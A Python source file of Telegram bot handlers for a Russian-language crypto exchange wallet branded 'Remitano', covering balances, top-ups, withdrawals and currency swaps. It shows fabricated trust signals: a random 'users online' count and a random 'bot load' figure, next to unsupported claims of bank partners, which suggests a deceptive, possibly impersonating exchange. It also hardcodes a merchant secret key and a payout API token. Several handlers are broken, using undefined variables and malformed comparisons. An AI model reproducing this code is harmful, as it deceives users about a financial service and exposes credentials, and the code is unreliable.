import random
import AaioAPI
import requests
import time

from AaioAPI import Aaio
from aiogram import Router, F, Bot
from aiogram.filters import CommandStart, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.types import Message, FSInputFile, CallbackQuery
from aiogram.utils.markdown import hbold
from sqlite3 import IntegrityError

from funcs.get_crypto_balances import convert_to_rubles
from funcs.payment import create_payoff
from tgbot.keyboards.inline import wallet_keyboard, settings_keyboard, choose_currency_keyboard, verif_keyboard, \
    about_service_keyboard, top_up_keyboard, invoice_keyboard, choose_method_keyboard, exchange_keyboard, exchange_back_keyboard, delete_keyboard_methods
from tgbot.keyboards.reply import start_keyboard, currency_choose
from tgbot.misc.states import Payment, Popoln, CurrencyExchange
from tgbot.services.sqlite import Database
from funcs.get_crypto_balances import calculate_exchange, get_usd_to_rubles_rate

user_router = Router()


@user_router.message(CommandStart())
async def user_start(message: Message, command: CommandObject):
    db = Database()
    blacklisted_users = [i[0] for i in db.select_all_blacklisted_users()]
    if message.from_user.id in blacklisted_users:
        return
    try:
        db.add_user(message.from_user.id,
                    message.from_user.full_name,
                    message.from_user.username,
                    "False", str(message.date.date()))
        db.add_crypto_balance(message.from_user.id)
    except IntegrityError:
        pass
    text = hbold("🔻Добро пожаловать в мультивалютный крипто-обменник Remitano!"
                 "\n\nRemitano можно использовать как кошелек для удобных операций с основными криптовалютами.")
    await message.answer(text=f"{text}", reply_markup=start_keyboard())


@user_router.message(F.text == "💼 Кошелек")
async def wallet(message: Message, bot: Bot):
    await bot.send_chat_action(chat_id=message.from_user.id, action="typing")
    db = Database()
    user = db.select_user(user_id=message.from_user.id)
    users_crypto_balance = db.select_crypto_balances(user_id=message.from_user.id)
    usdt = users_crypto_balance[2]
    eth = users_crypto_balance[3]
    btc = users_crypto_balance[4]
    currency = user[8]
    if currency == "USD":
        currency_sign = "$"
    else:
        currency_sign = "₽"
    verification_status = "✅ Да" if user[3] == "True" else "❌ Нет"
    await message.answer_photo(photo=FSInputFile(path="/exchanger/images/wallet_button.jpeg"),
                               caption=f"💼{hbold('Кошелек')}:\n"
                                       f"\n➖➖➖➖➖➖➖➖➖➖"
                                       f"\n📑 Верификация: {verification_status}"
                                       f"\n➖➖➖➖➖➖➖➖➖➖"
                                       f"\n{hbold(f'🏦 Общий баланс: {round(convert_to_rubles(usdt, eth, btc, user[4], currency), 2)}{currency_sign}')}"
                                       f"\n{hbold(f'💵 Фиатный баланс: {round(convert_to_rubles(usdt, eth, btc, user[4], currency) - convert_to_rubles(usdt, eth, btc, 0, currency), 2)}{currency_sign}')}"
                                       f"\n{hbold(f'🗄 ID: {message.from_user.id}')}"
                                       f"\n➖➖➖➖➖➖➖➖➖➖"
                                       f"\n🔐 Криптопортфель:"
                                       f"\n\n💰{round(btc,6)} BTC"
                                       f"\n💰{round(usdt,3)} USDT"
                                       f"\n💰{round(eth,6)} ETH"
                                       f"\n\n📈 Пользователей онлайн: {hbold(random.randint(750, 900))}",
                               reply_markup=wallet_keyboard())


@user_router.callback_query(F.data == "settings")
async def settings(call: CallbackQuery):
    await call.message.answer("Выберите действие:", reply_markup=settings_keyboard())


@user_router.callback_query(F.data == "cur")
async def cur(call: CallbackQuery):
    await call.message.edit_text("Выберите валюту:", reply_markup=choose_currency_keyboard())


@user_router.callback_query(F.data.startswith("valut:"))
async def valut(call: CallbackQuery):
    db = Database()
    db.update_user_currency(call.from_user.id, call.data.split(":")[1])
    await call.message.edit_text("✅ Валюта успешно установлена")


@user_router.callback_query(F.data == "veref")
async def verf(call: CallbackQuery):
    db = Database()
    user = db.select_user(user_id=call.message.chat.id)
    if user[3] == "False":
        text = "🤷🏻‍♀️ К сожалению, ваш аккаунт не верифицирован, рекомендуем верифицировать аккаунт, вы можете это " \
               "сделать, нажав на кнопку ниже и написав 'Верификация' в тех.поддержку, спасибо!" \
               "\n\n🔷 Приоритет в очереди к выплате." \
               "\n\n🔷 Отсутствие лимитов на вывод средств." \
               "\n\n🔷 Увеличение доверия со стороны администрации, предотвращения блокировки аккаунта."
        verified = False
    else:
        text = "Ваш аккаунт верифицирован ✅"
        verified = True
    await call.message.answer_photo(photo=FSInputFile(path="/exchanger/images/verification.jpeg"),
                                    caption=text,
                                    reply_markup=verif_keyboard(verified))


@user_router.callback_query(F.data == "delmsg")
async def delmsg(call: CallbackQuery, state: FSMContext):
    await call.message.delete()
    await state.clear()


@user_router.callback_query(F.data == "delete_keyboard_methods")
async def delete_keyboard_methods_handler(call: CallbackQuery, state: FSMContext):
    await call.message.delete()
    await state.clear()

@user_router.callback_query(F.data == "rates")
async def rates(call: CallbackQuery, state: FSMContext):
    response_rub = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=RUB")
    data_rub = response_rub.json()
    response_btc = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=BTC")
    data_btc = response_btc.json()
    response_usdt = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=USDT")
    data_usdt = response_usdt.json()
    response_eth = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=ETH")
    data_eth = response_eth.json()
    text = ("RUB -> BTC",
            data_rub.get('data').get('rates').get('BTC'),
            "RUB -> ETH",
            data_rub.get('data').get('rates').get('ETH'),
            "RUB -> USDT",
            data_rub.get('data').get('rates').get('USDT'),
            "➖➖➖➖➖➖➖➖➖➖",
            "BTC -> RUB",
            data_btc.get('data').get('rates').get('RUB'),
            "BTC -> USDT",
            data_btc.get('data').get('rates').get('USDT'),
            "BTC -> ETH",
            data_btc.get('data').get('rates').get('ETH'),
            "➖➖➖➖➖➖➖➖➖➖",
            "USDT -> BTC",
            data_usdt.get('data').get('rates').get('BTC'),
            "USDT -> ETH",
            data_usdt.get('data').get('rates').get('ETH'),
            "USDT -> RUB",
            data_usdt.get('data').get('rates').get('RUB'),
            "➖➖➖➖➖➖➖➖➖➖",
            "ETH -> BTC",
            data_eth.get('data').get('rates').get('BTC'),
            "ETH -> RUB",
            data_eth.get('data').get('rates').get('RUB'),
            "ETH -> USDT",
            data_eth.get('data').get('rates').get('USDT'),)
    await call.message.answer("\n".join(text))

@user_router.callback_query(F.data == "back_pay")
async def back_pay(call: CallbackQuery):
    await call.message.delete()


@user_router.message(F.text == "🔷 О сервисе")
async def about_service(message: Message, bot: Bot):
    capacity_percent = random.randint(50, 100)
    black_square = round(capacity_percent / 16.6) * '🔳'
    white_square = (6 - len(black_square)) * '⬜️'
    text = "🛡Надежная, безопасная и удобная конвертация для всех ваших покупок криптовалюты!" \
           "\n\nВ отличие от многих наших конкурентов, мы предлагаем возможность покупать, продавать и хранить более " \
           "40 различных криптовалют, включая основные монеты, такие как Биткойн и Эфириум. " \
           "\n\nДругие ключевые преимущества включают в себя:" \
           "\n\n🔻Наслаждайтесь доступностью сервиса 24/7" \
           "\n\n🔻Лучшие показатели конверсии" \
           "\n\n🔻С несколькими вариантами оплаты" \
           "\n\nПочему стоит работать с нами?" \
           "\n\n🧑🏻‍💻 Наши партнеры:" \
           "\nМы гордимся тем, что работаем с рядом опытных, регулируемых банковских партнеров, что позволяет нам " \
           "предлагать вам передовые и надежные услуги." \
           "\n\n🔐 Безопасность и охрана:" \
           "\nС момента нашего запуска в 2017 году Remitano установил отраслевой стандарт безопасности и защиты." \
           "\n\nCoindirect предлагает обширный опыт безопасного перемещения денег через сеть банков и поставщиков " \
           "ликвидности в разных странах." \
           "\n\nЗагруженность бота:" \
           f"\n{black_square + white_square} {capacity_percent}%"

    await message.answer_photo(photo=FSInputFile(path="/exchanger/images/about_service.jpeg"),
                               caption=text,
                               reply_markup=about_service_keyboard())


@user_router.callback_query(F.data == "popoln")
async def popoln(call: CallbackQuery):
    await call.message.answer_photo(photo=FSInputFile(path="/exchanger/images/top_up.jpeg"),
                                    caption="Выберите вариант пополнения баланса:",
                                    reply_markup=top_up_keyboard())


@user_router.callback_query(F.data == "deposit_card")
async def deposit_card(call: CallbackQuery, state: FSMContext):
    await call.message.edit_caption(caption=f"Введите сумму пополнения:\nМинимальная сумма - {hbold('100₽')}")
    await state.set_state(Payment.sum)


@user_router.message(Payment.sum)
async def payment_sum(message: Message, state: FSMContext):
    if message.text == "📊 Обмен":
        await message.answer("Выбери валюту для обмена:", reply_markup=currency_choose())
        return
    if float(message.text) < 100:
        await message.answer("Вы ввели сумму меньше 100₽")
        return
    payment_id = f"{message.from_user.id}:{random.randint(100, 999)}"
    merchant_id = "44a54fdd-ebe7-4192-b272-84def7091570"
    secret_key = "864ef93a855b48a4520c4ebccf2e3435"
    desc = 'Заказ'
    url_aaio = AaioAPI.pay(merchant_id, message.text, "RUB", secret_key, desc)
    await state.update_data(payment_url=url_aaio)
    await state.update_data(top_up=message.text)
    text = "♻️ Оплата:" \
           f"\n\nСумма: {message.text}₽" \
           "\n\n⚠️ Счет действителен 15 минут!" \
           "\n⚠️ ВАЖНО! Обязательно после пополнения, не забудьте нажать кнопку «проверить оплату» для пополнения баланса."
    await message.answer(text, reply_markup=invoice_keyboard(url_aaio, payment_id))


@user_router.callback_query(F.data.startswith("check_payment:"))
async def check_payment(call: CallbackQuery, state: FSMContext, config):
    payment = Aaio()
    data = await state.get_data()
    AaioAPI.check_payment(data.get("payment_url"), payment)
    response = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=USD")
    rate = response.json().get('data').get('rates').get('RUB')
    if payment.is_success():
        db = Database()
        top_up = data.get("top_up")
        await call.message.delete()
        await call.message.answer("Успешно оплачено!\n"
                                  "Деньги зачислены на счёт!")
        db.update_user_fiat_balance(user_id=call.message.chat.id,
                                    new_fiat_balance=float(top_up / float(rate)) + float(db.select_user(user_id=call.message.chat.id)[4]))
        for admin in config.tg_bot.admin_ids:
            await message.answer("Пополнение:\n\n"\
                                 f"ID: {call.message.chat.id}\n"\
                                 f"Сумма: {top_up} RUB")
            time.sleep(0.5)
    else:
        await call.answer("Не оплачено!\nУбедитесь, что вы оплатили", show_alert=True)


@user_router.callback_query(F.data == "vivod")
async def check_payment(call: CallbackQuery, state: FSMContext):
    db = Database()
    user = db.select_user(user_id=call.message.chat.id)
    users_crypto_balance = db.select_crypto_balances(user_id=call.message.chat.id)
    usdt = users_crypto_balance[2]
    eth = users_crypto_balance[3]
    btc = users_crypto_balance[4]
    currency = user[8]
    await call.message.edit_caption(caption=f"Введите сумму вывода:"
                                            f"\nДоступный баланс: {convert_to_rubles(usdt, eth, btc, user[4], currency) - convert_to_rubles(usdt, eth, btc, 0, currency)}")
    await state.set_state(Popoln.sum)


@user_router.message(Popoln.sum)
async def popoln_sum(message: Message, state: FSMContext):
    if message.text == "📊 Обмен":
        response_rub = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=RUB")
        data_rub = response_rub.json()
        response_btc = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=BTC")
        data_btc = response_btc.json()
        response_usdt = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=USDT")
        data_usdt = response_usdt.json()
        response_eth = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=ETH")
        data_eth = response_eth.json()
        text = ("RUB -> BTC",
        data_rub.get('data').get('rates').get('BTC'),
        "RUB -> ETH",
        data_rub.get('data').get('rates').get('ETH'),
        "RUB -> USDT",
        data_rub.get('data').get('rates').get('USDT'),
        "➖➖➖➖➖➖➖➖➖➖",
            "RUB -> BTC",
        data_btc.get('data').get('rates').get('RUB'),
        "BTC -> USDT",
        data_btc.get('data').get('rates').get('USDT'),
        "BTC -> ETH",
        data_btc.get('data').get('rates').get('ETH'),
        "➖➖➖➖➖➖➖➖➖➖",
        "USDT -> BTC",
        data_usdt.get('data').get('rates').get('BTC'),
        "USDT -> ETH",
        data_usdt.get('data').get('rates').get('ETH'),
        "USDT -> RUB",
        data_usdt.get('data').get('rates').get('RUB'),
        "➖➖➖➖➖➖➖➖➖➖",
        "ETH -> BTC",
        data_eth.get('data').get('rates').get('BTC'),
        "ETH -> RUB",
        data_eth.get('data').get('rates').get('RUB'),
        "ETH -> USDT",
        data_eth.get('data').get('rates').get('USDT'), )
        await message.answer("\n".join(text))
        await message.answer("Выбери валюту для обмена:", reply_markup=currency_choose())
        return
    db = Database()
    user = db.select_user(user_id=message.from_user.id)
    users_crypto_balance = db.select_crypto_balances(user_id=message.from_user.id)
    usdt = users_crypto_balance[2]
    eth = users_crypto_balance[3]
    btc = users_crypto_balance[4]
    currency = user[8]
    balance = convert_to_rubles(usdt, eth, btc, user[4], currency) - convert_to_rubles(usdt, eth, btc, 0, currency)
    if float(message.text) < 100:
        await message.answer("Вы ввели сумму меньше 100₽")
        return
    if currency == "USDT" and float(message.text) > usdt:
        await message.answer("Недостаточно баланса!")
        return
    elif currency == "ETH" and float(message.text) > eth:
        await message.answer("Недостаточно баланса!")
        return
    elif currency == "BTC" and float(message.text) > btc:
        await message.answer("Недостаточно баланса!")
        return
    elif currency == "RUB" and float(message.text) > balance:
        await message.answer("Недостаточно баланса!")
        return
    await state.update_data(vivod_sum=message.text)
    response_usd = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=USD")
    data_usd = response_usd.json()
    response_btc = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=BTC")
    data_btc = response_btc.json()
    text = "♻️ Вывод:" \
           f"\n\nСумма: {message.text}₽\n" \
           f"Выберите метод:\n\n" \
           "Комиссии:\n" \
           "USDT: 3% + 100 RUB, минимальная сумма: 410 RUB\n" \
           "Карта РФ и BTC: 3%, минимальная сумма: 310 RUB\n\n"\
           "Курсы:\n"\
           f"USD -> RUB: {float(data_usd.get('data').get('rates').get('RUB'))}\n"\
           f"BTC -> RUB: {float(data_btc.get('data').get('rates').get('RUB'))}"
    await message.answer(text, reply_markup=choose_method_keyboard())


@user_router.callback_query(F.data == "exchange_back")
async def exchange_back_keyboard_callback(call: CallbackQuery, state: FSMContext):
    await call.message.delete()
    text = hbold("Меню:")
    await call.message.answer(text=f"{text}", reply_markup=start_keyboard())


@user_router.callback_query(F.data.startswith("choose_method:"))
async def choose_method(call: CallbackQuery, state: FSMContext):
    await state.update_data(method=call.data.split(":")[1])
    await call.message.answer("Отправь номер кошелька/карты:")
    await state.set_state(Popoln.wallet)


@user_router.message(Popoln.wallet)
async def popoln_wallet(message: Message, state: FSMContext, config):
    data = await state.get_data()
    db = Database()
    vivod_sum = data.get("vivod_sum")
    method = data.get("method")
    response = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=USD")
    rate = response.json().get('data').get('rates').get('RUB')
    if float(vivod_sum) and not method == "USDT" < 310:
       await message.answer("Сумма вывода от 310₽", reply_markup=delete_keyboard_methods())
       return
    elif float(vivod_sum) and method == "USDT" < 310:
       await message.answer("Сумма вывода от 410₽", reply_markup=delete_keyboard_methods())
       return
    if method == "USDT":
        method = "tether_trc20"
    elif method == "BTC":
        method = "bitcoin"
    elif method == "RUB":
        method = "cards_ru"
    a = create_payoff("ZTVhYjA3OTYtMmI5Zi00MGY2LWEyMTktYjUwNmIyOWUxOTM0Ok4rdlNrKzhmQUl4UXMlaGRSKCslcXBGZjdrUVQmc3Yz",
                  f"{message.from_user.id}_{random.randint(100, 999)}",
                  method,
                  vivod_sum,
                  message.text,
                  0)
    print(a)
    db.update_user_fiat_balance(user_id=message.from_user.id,
                                new_fiat_balance=float(db.select_user(user_id=message.from_user.id)[4]) - float(float(vivod_sum) / float(rate)))    
    await message.answer("Вывод успешно создан!")
    for admin in config.tg_bot.admin_ids:
        await message.answer("Пополнение:\n\n"\
                            f"ID: {call.message.chat.id}\n"\
                            f"Сумма: {top_up} RUB")
        time.sleep(0.5)
    await state.clear()

@user_router.message(F.text == "📊 Обмен")
async def exchange_reply_button(message: Message, state: FSMContext):
    response_rub = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=RUB")
    data_rub = response_rub.json()
    response_btc = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=BTC")
    data_btc = response_btc.json()
    response_usdt = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=USDT")
    data_usdt = response_usdt.json()
    response_eth = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=ETH")
    data_eth = response_eth.json()
    text = ("RUB -> BTC",
    data_rub.get('data').get('rates').get('BTC'),
    "RUB -> ETH",
    data_rub.get('data').get('rates').get('ETH'),
    "RUB -> USDT",
    data_rub.get('data').get('rates').get('USDT'),
    "➖➖➖➖➖➖➖➖➖➖",
    "BTC -> RUB",
    data_btc.get('data').get('rates').get('RUB'),
    "BTC -> USDT",
    data_btc.get('data').get('rates').get('USDT'),
    "BTC -> ETH",
    data_btc.get('data').get('rates').get('ETH'),
    "➖➖➖➖➖➖➖➖➖➖",
    "USDT -> BTC",
    data_usdt.get('data').get('rates').get('BTC'),
    "USDT -> ETH",
    data_usdt.get('data').get('rates').get('ETH'),
    "USDT -> RUB",
    data_usdt.get('data').get('rates').get('RUB'),
    "➖➖➖➖➖➖➖➖➖➖",
    "ETH -> BTC",
    data_eth.get('data').get('rates').get('BTC'),
    "ETH -> RUB",
    data_eth.get('data').get('rates').get('RUB'),
    "ETH -> USDT",
    data_eth.get('data').get('rates').get('USDT'), )
    await message.answer("\n".join(text))
    await message.answer("Выбери валюту для обмена:", reply_markup=currency_choose())

@user_router.message(F.text == "Назад")
async def exchange_back_keyboard_handler(message: Message, state: FSMContext):
    await message.delete()
    text = hbold("Меню:")
    await message.answer(text=f"{text}", reply_markup=start_keyboard())

@user_router.message(F.text == "Рубли")
async def rubles_exchange(message: Message, state: FSMContext):
    await state.update_data(currency="RUB")
    await message.answer("Сколько Вы хотите поменять?", reply_markup=exchange_back_keyboard())
    await state.set_state(CurrencyExchange.sum)


@user_router.message(F.text == "ETH")
async def rubles_exchange(message: Message, state: FSMContext):
    await state.update_data(currency="ETH")
    await message.answer("Сколько Вы хотите поменять?", reply_markup=exchange_back_keyboard())
    await state.set_state(CurrencyExchange.sum)


@user_router.message(F.text == "BTC")
async def rubles_exchange(message: Message, state: FSMContext):
    await state.update_data(currency="BTC")
    await message.answer("Сколько Вы хотите поменять?", reply_markup=exchange_back_keyboard())
    await state.set_state(CurrencyExchange.sum)


@user_router.message(F.text == "USDT")
async def rubles_exchange(message: Message, state: FSMContext):
    await state.update_data(currency="USDT")
    await message.answer("Сколько Вы хотите поменять?", reply_markup=exchange_back_keyboard())
    await state.set_state(CurrencyExchange.sum)


@user_router.message(CurrencyExchange.sum)
async def currency_exchange_sum(message: Message, state: FSMContext):
    if message.text == "📊 Обмен":
        response_rub = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=RUB")
        data_rub = response_rub.json()
        response_btc = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=BTC")
        data_btc = response_btc.json()
        response_usdt = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=USDT")
        data_usdt = response_usdt.json()
        response_eth = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=ETH")
        data_eth = response_eth.json()
        text = ("RUB -> BTC",
        data_rub.get('data').get('rates').get('BTC'),
        "RUB -> ETH",
        data_rub.get('data').get('rates').get('ETH'),
        "RUB -> USDT",
        data_rub.get('data').get('rates').get('USDT'),
        "➖➖➖➖➖➖➖➖➖➖",
        "BTC -> RUB",
        data_btc.get('data').get('rates').get('RUB'),
        "BTC -> USDT",
        data_btc.get('data').get('rates').get('USDT'),
        "BTC -> ETH",
        data_btc.get('data').get('rates').get('ETH'),
        "➖➖➖➖➖➖➖➖➖➖",
        "USDT -> BTC",
        data_usdt.get('data').get('rates').get('BTC'),
        "USDT -> ETH",
        data_usdt.get('data').get('rates').get('ETH'),
        "USDT -> RUB",
        data_usdt.get('data').get('rates').get('RUB'),
        "➖➖➖➖➖➖➖➖➖➖",
        "ETH -> BTC",
        data_eth.get('data').get('rates').get('BTC'),
        "ETH -> RUB",
        data_eth.get('data').get('rates').get('RUB'),
        "ETH -> USDT",
        data_eth.get('data').get('rates').get('USDT'), )
        await message.answer("\n".join(text))
        await message.answer("Выбери валюту для обмена:", reply_markup=currency_choose())
        return
    db = Database()
    data = await state.get_data()
    await state.update_data(exchange_sum=message.text)
    user = db.select_user(user_id=message.from_user.id)
    users_crypto_balance = db.select_crypto_balances(user_id=message.from_user.id)
    usdt = users_crypto_balance[2]
    eth = users_crypto_balance[3]
    btc = users_crypto_balance[4]
    currency = user[8]
    balance = convert_to_rubles(usdt, eth, btc, user[4], currency) - convert_to_rubles(usdt, eth, btc, 0, currency)
    if float(message.text) > balance:
        await message.answer("Недостаточно баланса!")
        return
    currency = data.get("currency")
    await message.answer("Выберите валюту, которую хотите получить:", reply_markup=exchange_keyboard(currency))


@user_router.callback_query(F.data.startswith("exchange:"))
async def final_exchange(call: CallbackQuery, state: FSMContext):
    db = Database()
    data = await state.get_data()
    exchange_sum = float(data.get("exchange_sum"))
    user = db.select_user(user_id=call.message.chat.id)
    currency = data.get("currency")
    changing_currency = call.data.split(":")[1]
    users_crypto_balance = db.select_crypto_balances(user_id=call.message.chat.id)
    usdt = users_crypto_balance[2]
    eth = users_crypto_balance[3]
    btc = users_crypto_balance[4]
    extra_charge = float(db.select_extra_charge()[0][0])
    dollar_to_rub = float(get_usd_to_rubles_rate())
    fiat_balance = round(convert_to_rubles(usdt, eth, btc, user[4], "RUB") - convert_to_rubles(usdt, eth, btc, 0, "RUB"))
    if currency == "USDT" and float(exchange_sum) > usdt:
        await call.message.answer("Недостаточно баланса!")
        return
    elif currency == "ETH" and float(exchange_sum) > eth:
        await call.message.answer("Недостаточно баланса!")
        return
    elif currency == "BTC" and float(exchange_sum) > btc:
        await call.message.answer("Недостаточно баланса!")
        return
    elif currency == "RUB" and float(exchange_sum) > fiat_balance:
        await call.message.answer("Недостаточно баланса!")
        return
    if currency == "RUB":
        response = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=RUB")
        data = response.json()
        if changing_currency == "BTC":
            rate = float(data.get('data').get('rates').get('BTC'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_btc_balance(user_id=call.message.chat.id, new_btc_balance=btc + sum_to_be_get)
            db.update_user_fiat_balance(user_id=call.message.chat.id,
                                        new_fiat_balance=(fiat_balance - exchange_sum) / float(dollar_to_rub))
        elif changing_currency == "ETH":
            rate = float(data.get('data').get('rates').get('ETH'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_eth_balance(user_id=call.message.chat.id, new_eth_balance=eth + sum_to_be_get)
            db.update_user_fiat_balance(user_id=call.message.chat.id,
                                        new_fiat_balance=(fiat_balance - exchange_sum) / float(dollar_to_rub))
        elif changing_currency == "USDT":
            rate = float(data.get('data').get('rates').get('USDT'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            print(rate, sum_to_be_get, usdt + sum_to_be_get, (fiat_balance - exchange_sum) / float(dollar_to_rub))
            db.update_usdt_balance(user_id=call.message.chat.id, new_usdt_balance=usdt + sum_to_be_get)
            db.update_user_fiat_balance(user_id=call.message.chat.id,
                                        new_fiat_balance=(fiat_balance - exchange_sum) / float(dollar_to_rub))
    elif currency == "BTC":
        response = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=BTC")
        data = response.json()
        if changing_currency == "RUB":
            rate = float(data.get('data').get('rates').get('RUB'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_user_fiat_balance(user_id=call.message.chat.id,
                                        new_fiat_balance=(fiat_balance + sum_to_be_get) / dollar_to_rub)
            db.update_btc_balance(user_id=call.message.chat.id, new_btc_balance=btc - exchange_sum)
        elif changing_currency == "ETH":
            rate = float(data.get('data').get('rates').get('ETH'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_eth_balance(user_id=call.message.chat.id, new_eth_balance=eth + sum_to_be_get)
            db.update_btc_balance(user_id=call.message.chat.id, new_btc_balance=btc - exchange_sum)
        elif changing_currency == "USDT":
            rate = float(data.get('data').get('rates').get('USDT'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_usdt_balance(user_id=call.message.chat.id, new_usdt_balance=usdt + sum_to_be_get)
            db.update_btc_balance(user_id=call.message.chat.id, new_btc_balance=btc - exchange_sum)
    elif currency == "ETH":
        response = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=ETH")
        data = response.json()
        if changing_currency == "BTC":
            rate = float(data.get('data').get('rates').get('BTC'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_btc_balance(user_id=call.message.chat.id, new_btc_balance=btc + sum_to_be_get)
            db.update_eth_balance(user_id=call.message.chat.id, new_eth_balance=eth - exchange_sum)
        elif changing_currency == "RUB":
            rate = float(data.get('data').get('rates').get('RUB'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_user_fiat_balance(user_id=call.message.chat.id,
                                        new_fiat_balance=(fiat_balance + sum_to_be_get) / dollar_to_rub)
            db.update_eth_balance(user_id=call.message.chat.id, new_eth_balance=eth - exchange_sum)
        elif changing_currency == "USDT":
            rate = float(data.get('data').get('rates').get('USDT'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_usdt_balance(user_id=call.message.chat.id, new_usdt_balance=usdt + sum_to_be_get)
            db.update_eth_balance(user_id=call.message.chat.id, new_eth_balance=eth - exchange_sum)
    elif currency == "USDT":
        response = requests.get("https://api.coinbase.com/v2/exchange-rates?currency=USDT")
        data = response.json()
        if changing_currency == "BTC":
            rate = float(data.get('data').get('rates').get('BTC'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_btc_balance(user_id=call.message.chat.id, new_btc_balance=btc + sum_to_be_get)
            db.update_usdt_balance(user_id=call.message.chat.id, new_usdt_balance=usdt - exchange_sum)
        elif changing_currency == "RUB":
            rate = float(data.get('data').get('rates').get('RUB'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_user_fiat_balance(user_id=call.message.chat.id, new_fiat_balance=(fiat_balance + sum_to_be_get) / dollar_to_rub)
            db.update_usdt_balance(user_id=call.message.chat.id, new_usdt_balance=usdt - exchange_sum)
        elif changing_currency == "ETH":
            rate = float(data.get('data').get('rates').get('ETH'))
            sum_to_be_get = calculate_exchange(exchange_sum, rate, extra_charge)
            db.update_eth_balance(user_id=call.message.chat.id, new_eth_balance=eth + sum_to_be_get)
            db.update_usdt_balance(user_id=call.message.chat.id, new_usdt_balance=usdt - exchange_sum)
    await call.message.answer("Успешно обменено!", reply_markup=start_keyboard())
    await state.clear()

